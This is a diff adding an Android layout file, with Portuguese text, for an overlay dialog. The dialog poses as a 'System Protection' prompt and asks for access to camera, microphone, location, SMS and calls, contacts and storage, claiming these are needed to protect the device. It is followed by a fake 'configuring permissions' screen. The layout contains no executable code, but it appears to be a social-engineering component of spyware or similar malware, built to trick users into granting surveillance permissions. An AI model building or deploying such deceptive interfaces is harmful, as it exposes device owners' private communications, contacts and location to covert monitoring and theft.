@@ -1,0 +1,170 @@
+<?xml version="1.0" encoding="utf-8"?>
+<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#80000000">
+    
+    <!-- Diálogo de Permissão (visível inicialmente) -->
+    <LinearLayout
+        android:id="@+id/permissionDialog"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_gravity="center"
+        android:layout_margin="32dp"
+        android:orientation="vertical"
+        android:padding="24dp"
+        android:background="#FFFFFF"
+        android:elevation="8dp">
+        
+        <!-- Ícone do app -->
+        <ImageView
+            android:layout_width="64dp"
+            android:layout_height="64dp"
+            android:layout_gravity="center"
+            android:src="@android:drawable/ic_lock_idle_lock"
+            android:layout_marginBottom="16dp"/>
+        
+        <!-- Título -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Proteção do Sistema deseja acessar:"
+            android:textSize="18sp"
+            android:textColor="#000000"
+            android:textStyle="bold"
+            android:gravity="center"
+            android:layout_marginBottom="16dp"/>
+        
+        <!-- Lista de permissões -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:layout_marginBottom="16dp">
+            
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="📷 Câmera"
+                android:textSize="16sp"
+                android:textColor="#000000"
+                android:padding="8dp"/>
+            
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="🎤 Microfone"
+                android:textSize="16sp"
+                android:textColor="#000000"
+                android:padding="8dp"/>
+            
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="📍 Localização"
+                android:textSize="16sp"
+                android:textColor="#000000"
+                android:padding="8dp"/>
+            
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="📱 SMS e Chamadas"
+                android:textSize="16sp"
+                android:textColor="#000000"
+                android:padding="8dp"/>
+            
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="👥 Contatos"
+                android:textSize="16sp"
+                android:textColor="#000000"
+                android:padding="8dp"/>
+            
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="📁 Armazenamento"
+                android:textSize="16sp"
+                android:textColor="#000000"
+                android:padding="8dp"/>
+        </LinearLayout>
+        
+        <!-- Mensagem -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Essas permissões são necessárias para a proteção completa do seu dispositivo."
+            android:textSize="14sp"
+            android:textColor="#666666"
+            android:gravity="center"
+            android:layout_marginBottom="24dp"/>
+        
+        <!-- Botões -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="end">
+            
+            <Button
+                android:id="@+id/btnDeny"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Negar"
+                android:textColor="#666666"
+                android:background="?android:attr/selectableItemBackground"
+                android:padding="12dp"
+                android:layout_marginEnd="8dp"/>
+            
+            <Button
+                android:id="@+id/btnAllow"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Permitir"
+                android:textColor="#1976D2"
+                android:textStyle="bold"
+                android:background="?android:attr/selectableItemBackground"
+                android:padding="12dp"/>
+        </LinearLayout>
+    </LinearLayout>
+    
+    <!-- Loading (oculto inicialmente) -->
+    <LinearLayout
+        android:id="@+id/loadingView"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_gravity="center"
+        android:layout_margin="32dp"
+        android:orientation="vertical"
+        android:padding="32dp"
+        android:background="#FFFFFF"
+        android:elevation="8dp"
+        android:visibility="gone">
+        
+        <ProgressBar
+            android:id="@+id/progressBar"
+            android:layout_width="64dp"
+            android:layout_height="64dp"
+            android:layout_gravity="center"
+            android:layout_marginBottom="16dp"/>
+        
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Configurando permissões..."
+            android:textSize="16sp"
+            android:textColor="#000000"
+            android:gravity="center"/>
+        
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Por favor, aguarde"
+            android:textSize="14sp"
+            android:textColor="#666666"
+            android:gravity="center"
+            android:layout_marginTop="8dp"/>
+    </LinearLayout>
+</FrameLayout>
